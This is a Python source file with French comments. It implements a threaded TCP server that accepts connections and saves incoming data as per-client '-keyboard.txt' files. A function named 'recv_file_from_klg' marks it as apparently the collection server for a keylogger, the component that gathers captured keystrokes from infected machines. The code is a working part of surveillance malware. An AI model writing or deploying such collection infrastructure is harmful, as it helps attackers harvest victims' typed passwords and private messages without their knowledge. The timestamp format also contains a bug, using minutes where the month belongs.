import threading
import socket
import time
import sys
from datetime import datetime

def handle_co():
    global running_thrd, client_sockets

    while running_thrd:
        try:
            client, addr = server.accept()
            client_sockets.append(client)
            rcv_file_thread = threading.Thread(target=recv_file_from_klg, args=(client,addr))
            rcv_file_thread.start()
        except BlockingIOError:
            continue


def recv_file_from_klg(client_sock, addr):
    global running_thrd
    bufer_size = 1024 # Pour la reception des data
    
    try:
        while running_thrd:
            check_data_client = client_sock.recv(bufer_size).decode().strip()
            if not check_data_client:
                print("Aucune donée reçu fin de la connexion")
                return
            
            # Generation du nom de fichier unique
            timestamp = datetime.now().strftime("%Y_%M_%d %H_%M")
            ip_client = addr[0].replace(".", "-")
            unique_filename = f"{ip_client}_{timestamp}-keyboard.txt"

            with open(unique_filename, "wb") as f:
                print(f"Début de reception du fichier {unique_filename}")
                while running_thrd:
                    data = client_sock.recv(bufer_size)
                    if not data or b"<END>" in data:
                        f.write(data[:-5]) # Je supprime <END>
                        break
                    f.write(data)
                client_sock.sendall(b"ACK")
                print(f"Fin de reception du fichier {unique_filename}")
    except Exception as e:
        print(f"Erreur lors de la reception du fichier : {e}")
    finally:
        client_sock.close()


if __name__ == '__main__':
    host, port = ("localhost", 9998)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen()
    server.setblocking(True)

    running_thrd = True
    client_sockets = []

    thrd_co = threading.Thread(target=handle_co)
    thrd_co.start()

    try:
        while running_thrd:
            time.sleep(1)
    except KeyboardInterrupt:
        print("CTRL + C détecté")
        running_thrd = False
        for client in client_sockets:
            try:
                client.sendall(b"<SERVER_SHUTDOWN>")
            except Exception:
                pass
        server.close()
        thrd_co.join()
        print("Le serveur va s'éteindre")
        sys.exit()
